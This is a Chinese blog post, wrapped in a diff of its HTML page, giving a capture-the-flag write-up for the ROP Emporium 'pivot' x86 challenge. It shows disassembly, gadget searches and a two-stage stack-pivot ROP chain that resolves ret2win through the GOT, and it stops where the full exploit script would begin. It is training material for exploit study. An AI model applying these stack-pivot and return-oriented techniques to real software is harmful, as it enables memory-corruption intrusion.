@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guoxb.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="pivot(栈迁移)题目链接：https:&#x2F;&#x2F;ropemporium.com&#x2F;challenge&#x2F;pivot.html x86根据题目提示，我们需要进行栈迁移，因为留给我们的溢出长度太短了，不足以存放一个完整的ROP链。同时，题目还提示我们，程序中导入了链接库libpivot32.so  中的foodhold_function函数，并且ret2win函数也被包含在链接库中。根据前几个挑战的经验和题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Challenge7_pivot">
+<meta property="og:url" content="http://guoxb.top/2023/03/15/ROP_Emporium/Challenge7_pivot/index.html">
+<meta property="og:site_name" content="GuoXB&#39;s Blog">
+<meta property="og:description" content="pivot(栈迁移)题目链接：https:&#x2F;&#x2F;ropemporium.com&#x2F;challenge&#x2F;pivot.html x86根据题目提示，我们需要进行栈迁移，因为留给我们的溢出长度太短了，不足以存放一个完整的ROP链。同时，题目还提示我们，程序中导入了链接库libpivot32.so  中的foodhold_function函数，并且ret2win函数也被包含在链接库中。根据前几个挑战的经验和题">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-15T15:43:44.000Z">
+<meta property="article:modified_time" content="2023-03-28T14:00:09.663Z">
+<meta property="article:author" content="郭小白QAQ">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://guoxb.top/2023/03/15/ROP_Emporium/Challenge7_pivot/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Challenge7_pivot | GuoXB's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">GuoXB's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://guoxb.top/2023/03/15/ROP_Emporium/Challenge7_pivot/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/202303122318253.jpg">
+      <meta itemprop="name" content="郭小白QAQ">
+      <meta itemprop="description" content="精彩不亮丽，起落是无常">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="GuoXB's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Challenge7_pivot
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-15 23:43:44" itemprop="dateCreated datePublished" datetime="2023-03-15T23:43:44+08:00">2023-03-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-28 22:00:09" itemprop="dateModified" datetime="2023-03-28T22:00:09+08:00">2023-03-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ROP-Emporium/" itemprop="url" rel="index"><span itemprop="name">ROP_Emporium</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="pivot-栈迁移"><a href="#pivot-栈迁移" class="headerlink" title="pivot(栈迁移)"></a>pivot(栈迁移)</h1><p>题目链接：<a target="_blank" rel="noopener" href="https://ropemporium.com/challenge/pivot.html">https://ropemporium.com/challenge/pivot.html</a></p>
+<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>根据题目提示，我们需要进行栈迁移，因为留给我们的溢出长度太短了，不足以存放一个完整的ROP链。同时，题目还提示我们，程序中导入了链接库<code>libpivot32.so </code> 中的<code>foodhold_function</code>函数，并且<code>ret2win</code>函数也被包含在链接库中。根据前几个挑战的经验和题目的提示，我们可以猜到，需要用到ret2libc技术，调用链接库中的<code>ret2win</code>函数，拿到flag。</p>
+<p><strong>Note：</strong>有关栈迁移技术和ret2libc技术的介绍请查看PWN入门中的相关讲解，此处默认已经了解这两种技术。</p>
+<span id="more"></span>
+
+<p>首先，照例看下程序的保护情况：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec ./pivot32</span> </span><br><span class="line">[*]&#x27;/home/giantbranch/Desktop/rop_emporium_all_challenges/level7_pivot/32/pivot32&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RUNPATH:  &#x27;.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们查看下程序中的函数：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A ./pivot32</span> </span><br><span class="line">···</span><br><span class="line"><span class="meta prompt_">[0x08048570]&gt; </span><span class="language-bash">afl</span></span><br><span class="line">0x08048570    1     50 entry0</span><br><span class="line">0x080485a3    1      4 fcn.080485a3</span><br><span class="line">0x08048530    1      6 sym.imp.__libc_start_main</span><br><span class="line">0x08048488    3     35 sym._init</span><br><span class="line">0x080485c0    1      4 sym.__x86.get_pc_thunk.bx</span><br><span class="line">0x08048560    1      6 sym..plt.got</span><br><span class="line">0x080488a4    1     20 sym._fini</span><br><span class="line">0x080485d0    4     41 sym.deregister_tm_clones</span><br><span class="line">0x08048610    4     54 sym.register_tm_clones</span><br><span class="line">0x08048650    3     31 sym.__do_global_dtors_aux</span><br><span class="line">0x08048680    1      6 sym.frame_dummy</span><br><span class="line">0x08048750    1    199 sym.pwnme</span><br><span class="line">0x08048550    1      6 sym.imp.memset</span><br><span class="line">0x08048500    1      6 sym.imp.puts</span><br><span class="line">0x080484d0    1      6 sym.imp.printf</span><br><span class="line">0x080484c0    1      6 sym.imp.read</span><br><span class="line">0x08048817    1     21 sym.uselessFunction</span><br><span class="line">0x08048520    1      6 sym.imp.foothold_function</span><br><span class="line">0x08048510    1      6 sym.imp.exit</span><br><span class="line">0x080488a0    1      2 sym.__libc_csu_fini</span><br><span class="line">0x08048840    4     93 sym.__libc_csu_init</span><br><span class="line">0x080485b0    1      2 sym._dl_relocate_static_pie</span><br><span class="line">0x08048686    3    202 main</span><br><span class="line">0x08048540    1      6 sym.imp.setvbuf</span><br><span class="line">0x080484f0    1      6 sym.imp.malloc</span><br><span class="line">0x080484e0    1      6 sym.imp.free</span><br><span class="line"><span class="meta prompt_">[0x08048570]&gt; </span><span class="language-bash">ii</span></span><br><span class="line">[Imports]</span><br><span class="line">nth vaddr      bind   type   lib name</span><br><span class="line">―――――――――――――――――――――――――――――――――――――</span><br><span class="line">1   0x080484c0 GLOBAL FUNC       read</span><br><span class="line">2   0x080484d0 GLOBAL FUNC       printf</span><br><span class="line">3   0x080484e0 GLOBAL FUNC       free</span><br><span class="line">4   0x080484f0 GLOBAL FUNC       malloc</span><br><span class="line">5   0x08048500 GLOBAL FUNC       puts</span><br><span class="line">6   0x00000560 WEAK   NOTYPE     __gmon_start__</span><br><span class="line">7   0x08048510 GLOBAL FUNC       exit</span><br><span class="line">8   0x08048520 GLOBAL FUNC       foothold_function</span><br><span class="line">9   0x08048530 GLOBAL FUNC       __libc_start_main</span><br><span class="line">10  0x08048540 GLOBAL FUNC       setvbuf</span><br><span class="line">11  0x08048550 GLOBAL FUNC       memset</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到程序除了自身的<code>pwnme</code> <code>usefulFunction</code>外，还导入了链接库中的<code>foothold_function</code>，我们很容易想到，可能要在程序中调用<code>foothold_function</code>函数，通过它来泄露出libc的地址。</p>
+<p>我们依次来看下这几个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x08048570</span>]&gt; s sym.pwnme </span><br><span class="line">[<span class="number">0x08048750</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.pwnme(uint arg_8h)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    uint s;</span><br><span class="line">    </span><br><span class="line">    sym.imp.<span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Call ret2win() from libpivot&quot;</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot: %p\n&quot;</span>, arg_8h);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Send a ROP chain now and it will land there&quot;</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(<span class="number">0x8048994</span>);</span><br><span class="line">    sym.imp.read(<span class="number">0</span>, arg_8h, <span class="number">0x100</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Thank you!\n&quot;</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Now please send your stack smash&quot;</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(<span class="number">0x8048994</span>);</span><br><span class="line">    sym.imp.read(<span class="number">0</span>, &amp;s, <span class="number">0x38</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>pwnme</code>函数也告诉了我们调用链接库中的<code>ret2win</code>函数来拿flag，并且，为了降低难度，还给出了我们一块地址（下边称为<strong>新栈</strong>），让我们进行栈迁移操作。根据提示信息，第一次发送的内容会被存储在新栈中，第二次发送的内容用来触发栈溢出。</p>
+<p>注：从第二个<code>read</code>函数的参数中我们可以看到，它接收 0x38&#x3D;56byte 长的输入，我们计算得到的偏移量为 44 ，所以，真正我们能操作的溢出长度为 56 - 44 &#x3D; 12byte。这个长度是肯定不够存放完整的ROP链的，从这里我们也可以看到需要用到栈迁移技术。</p>
+<p>接下来我们看下<code>usefulFunction</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x08048750</span>]&gt; s sym.uselessFunction </span><br><span class="line">[<span class="number">0x08048817</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.uselessFunction</span><br><span class="line">      <span class="title function_">noreturn</span> </span><br><span class="line">               <span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    sym.imp.foothold_function();</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">    sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>usefulFunction</code>函数只是调用了<code>foothold_function</code>函数，这也是一个提示，提示我们通过这个函数来泄露地址。</p>
+<p>我们就加载分析链接库，看下<code>foothold_function</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A ./libpivot32.so</span></span><br><span class="line"><span class="meta prompt_">[0x00000680]&gt; </span><span class="language-bash">s sym.foothold_function</span> </span><br><span class="line"><span class="meta prompt_">[0x0000077d]&gt; </span><span class="language-bash">pdg</span></span><br><span class="line"></span><br><span class="line">// WARNING: Variable defined which should be unmapped: var_4h</span><br><span class="line"></span><br><span class="line">void sym.foothold_function(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    int32_t iVar1;</span><br><span class="line">    uint var_4h;</span><br><span class="line">    </span><br><span class="line">    iVar1 = sym.__x86.get_pc_thunk.ax();</span><br><span class="line">    sym.imp.puts(iVar1 + 0x2a7);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里用IDA看的比较明显，函数的作用就是输出一串字符串，也是一些提示信息。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">foothold_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>现在我们结合着函数内容，来整理一下思路：</p>
+<ol>
+<li>程序需要两个输入，在第二个输入处存在栈溢出（溢出长度较短），并且会将第一个输入处输入的内容存储到新栈上。</li>
+<li>我们可以利用第二个输入来进行栈迁移，在第一个输入处，输入完整的ROP链。</li>
+</ol>
+<p>接下来，就是找相关的gadgets了，反汇编后可以看到程序中仍然存在<code>usefulGadgets</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -dj .text -M intel ./pivot32</span> </span><br><span class="line">···</span><br><span class="line">0804882c &lt;usefulGadgets&gt;:</span><br><span class="line"> 804882c:	58                   	pop    eax</span><br><span class="line"> 804882d:	c3                   	ret    </span><br><span class="line"> 804882e:	94                   	xchg   esp,eax</span><br><span class="line"> 804882f:	c3                   	ret    </span><br><span class="line"> 8048830:	8b 00                	mov    eax,DWORD PTR [eax]</span><br><span class="line"> 8048832:	c3                   	ret    </span><br><span class="line"> 8048833:	01 d8                	add    eax,ebx</span><br><span class="line"> 8048835:	c3                   	ret    </span><br><span class="line"> 8048836:	66 90                	xchg   ax,ax</span><br><span class="line"> 8048838:	66 90                	xchg   ax,ax</span><br><span class="line"> 804883a:	66 90                	xchg   ax,ax</span><br><span class="line"> 804883c:	66 90                	xchg   ax,ax</span><br><span class="line"> 804883e:	66 90                	xchg   ax,ax</span><br></pre></td></tr></table></figure>
+
+<p><code>xchg</code>指令在上一个题中我们了解到，它的作用是交换两个操作数的值，并且也存在<code>pop eax;ret</code>，我们就可以利用这两个gadget来修改esp寄存器做栈迁移。但我比较喜欢使用<code>leave;ret</code>，而且程序中刚好有，这里我就使用<code>leave</code>来做栈迁移。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./pivot32 --only <span class="string">&quot;leave|ret&quot;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080485f5 : leave ; ret</span><br><span class="line">0x08048492 : ret</span><br><span class="line">0x0804861e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure>
+
+<p><code>mov eax,DWORD PTR [eax];ret</code>，<code>add eax,ebx;ret</code>，这两个gadget乍一看并不是很清楚他们是干嘛的，结合这道题仔细分析一下ret2libc的过程就懂了。</p>
+<p>通常我们是需要一个输出函数，比如<code>write\puts</code>等来打印出我们调用过的链接库中函数（具体到这里就是<code>foothold_function</code>）在<code>got</code>表中的真实地址。然后计算出libc库加载后的基地址。但是这样的话，如果我们就需要构造二次溢出，而且这里二次溢出的情况比较复杂（涉及到栈迁移，而且程序每次调用<code>pwnme</code>分配的新栈是不固定的（我测了几次，应该是不固定的）），如果我们使用二次溢出的话就会比较麻烦。</p>
+<p>这里我们就换一种思路，其实，只要调用过链接库中的函数（<code>foothold_function</code>）之后，它的<code>got</code>表内存储的就已经是绑定后的真实地址了，我们之前将它打印出来只是为了方便我们通过程序来做计算。这里我们通过程序来计算反而会变的复杂，我们就通过gadget来操作。</p>
+<p>思考一下，我们通过<code>ELF.got[&#39;foothold_function&#39;]</code>获取的只是<code>got</code>表表项的地址，在这个地址内存储的值才是真正我们想要的<code>foothold_function</code>的真实地址。这里，我们就明白了<code>mov eax,DWORD PTR [eax];ret</code>这个gadget的作用，我们将<code>got</code>表表项的地址通过<code>pop eax</code>传入<code>eax</code>，然后通过<code>move</code>获取表项内存储的<code>foot</code>函数的真实地址存入<code>eax</code>。此时我们也就明白了<code>add eax,ebx</code>这个gadget的作用，我们将<code>foothold_function</code>与<code>ret2win</code>这两个函数之间的偏移量存入<code>ebx</code>，通过<code>add</code>我们就能得到<code>ret2win</code>函数的真实地址(存放在<code>eax</code>)。接着我们就能调用<code>ret2win</code>函数拿到flag。</p>
+<p>按照这个思路，我们还需要操作<code>ebx</code>和调用<code>ret2win</code>的gadgets。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./pivot32 --only <span class="string">&quot;pop|ret&quot;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804882c : pop eax ; ret</span><br><span class="line">0x0804889b : pop ebp ; ret</span><br><span class="line">0x08048898 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080484a9 : pop ebx ; ret</span><br><span class="line">0x0804889a : pop edi ; pop ebp ; ret</span><br><span class="line">0x08048899 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048492 : ret</span><br><span class="line">0x0804861e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 8</span><br></pre></td></tr></table></figure>
+
+<p><code>0x080484a9 </code> 地址处的<code>pop ebx ; ret</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./pivot32 --only <span class="string">&quot;call|ret&quot;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804857b : call 0x80485a9</span><br><span class="line">0x0804848c : call 0x80485c6</span><br><span class="line">0x080485f0 : call eax</span><br><span class="line">0x0804863d : call edx</span><br><span class="line">0x08048492 : ret</span><br><span class="line">0x0804861e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 6</span><br></pre></td></tr></table></figure>
+
+<p><code>0x080485f0</code>地址处的 <code>call eax</code>，或者<code>jmp eax</code>也是可以的。</p>
+<p>（PS：这里我当时犯病糊涂了，想着为什么不能直接在返回地址处直接填<code>ret2win</code>函数的真实地址，而要再通过<code>call</code>或者<code>jmp</code>来调用，原因就是我们拿不到<code>eax</code>中存储的值，如果能拿到，也就是向往常那样二次溢出的情况，是可以用的，只能说犯病很严重。）</p>
+<p>我们所需要的东西都找齐了，可以构造我们的ROP链了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ROP1:</span><br><span class="line">padding			#迁移后要 pop到ebp中的值</span><br><span class="line">foothold.plt	#调用foothold函数</span><br><span class="line">pop_eax			#将got表表项地址pop到eax</span><br><span class="line">foothold.got 	</span><br><span class="line">mov_eax_[eax]	#获取foothold真实地址</span><br><span class="line">pop_ebx			#将offset pop到ebx</span><br><span class="line">offset			#offset = ret2win - foothold </span><br><span class="line">add_eax_ebx		#计算ret2win真实地址</span><br><span class="line">call_eax		#调用ret2win函数</span><br><span class="line"></span><br><span class="line">ROP2:</span><br><span class="line">padding			#offset - 4 把fake ebp的空间留出来</span><br><span class="line">fake ebp		#我们从程序输出中获取的新栈地址</span><br><span class="line">leave;ret		#栈迁移</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>完整的exploit代码如下所示：</p>
